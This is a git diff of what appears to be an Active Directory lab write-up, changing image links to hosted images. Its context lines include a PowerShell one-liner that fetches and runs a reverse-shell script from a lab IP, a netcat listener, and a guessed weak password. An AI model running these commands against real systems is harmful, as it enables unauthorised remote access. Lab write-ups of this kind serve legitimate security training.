@@ -97,9 +97,10 @@ with the top 200 share names.
 [*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
 ```
 
-![alt text](image-6.png)
+<img width="1800" height="570" alt="image" src="https://github.com/user-attachments/assets/76f91b18-2e2a-423b-9ee3-2a7528d683c9" />
 
-![alt text](image-7.png)
+<img width="1782" height="846" alt="image" src="https://github.com/user-attachments/assets/6e8d7fcb-edcb-4f19-94d3-8ff0559a7599" />
+
 
 ## Objective 2:
 ```
@@ -142,9 +143,11 @@ the studentx user has following interesting permissions
 - Full Control/Generic All on the Applocked Group Policy.
 ```
 
-![alt text](image.png)
-![alt text](image-1.png)
-![alt text](image-2.png)
+<img width="1685" height="608" alt="image" src="https://github.com/user-attachments/assets/8144bfaa-6d98-4e47-8685-c119764f9a43" />
+
+<img width="1757" height="895" alt="image" src="https://github.com/user-attachments/assets/584d2f42-c373-4582-b4e4-349a85edd84c" />
+
+<img width="1322" height="918" alt="image" src="https://github.com/user-attachments/assets/3d21b565-b457-40d4-9458-f53a94250a0d" />
 
 ## Objective 3
 ```
@@ -233,8 +236,9 @@ objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneyco
 ```
 
 ### To enumerate the ACLs for the Applocked and DevOps GPO, let's use the BloodHound CE UI
-![alt text](image-3.png)
-![alt text](image-5.png)
+<img width="1650" height="583" alt="image" src="https://github.com/user-attachments/assets/6ced5840-403d-4578-b6ed-335090d3ecd8" />
+
+<img width="1340" height="907" alt="image" src="https://github.com/user-attachments/assets/7f0d4020-43c9-4f35-a2cd-ed7163ddf436" />
 
 **A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.**
 
@@ -497,7 +501,8 @@ PORT     STATE SERVICE      REASON
 
 **Manually trying the usernames as passwords we can identify that the user builduser has password builduser.**
 
-![alt text](image-48.png)
+<img width="1808" height="554" alt="image" src="https://github.com/user-attachments/assets/101ef48b-c2b5-451d-9ea1-f10b7f97bbc2" />
+
 
 * powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
 
@@ -506,15 +511,15 @@ PORT     STATE SERVICE      REASON
 
 * C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 
-![alt text](image-11.png)
+<img width="1217" height="913" alt="image" src="https://github.com/user-attachments/assets/486d460b-02db-4333-8076-b8c41ca0ba6d" />
 
-![alt text](image-8.png)
+<img width="998" height="270" alt="image" src="https://github.com/user-attachments/assets/94b382f8-a67c-4ec0-9db1-d4dac86cbfa1" />
 
-![alt text](image-9.png)
+<img width="1351" height="642" alt="image" src="https://github.com/user-attachments/assets/8fbf74e8-1e35-4101-acfa-028a86e80889" />
 
-![alt text](image-10.png)
+<img width="1246" height="295" alt="image" src="https://github.com/user-attachments/assets/d8321fca-97fc-41cd-a935-471164169c39" />
 
-![alt text](image-12.png)
+<img width="1332" height="501" alt="image" src="https://github.com/user-attachments/assets/c455118f-8181-4bc7-a734-9d4962a47579" />
 
 * PS C:\Users\Administrator\.jenkins\workspace\Project0> $env:username
 ```
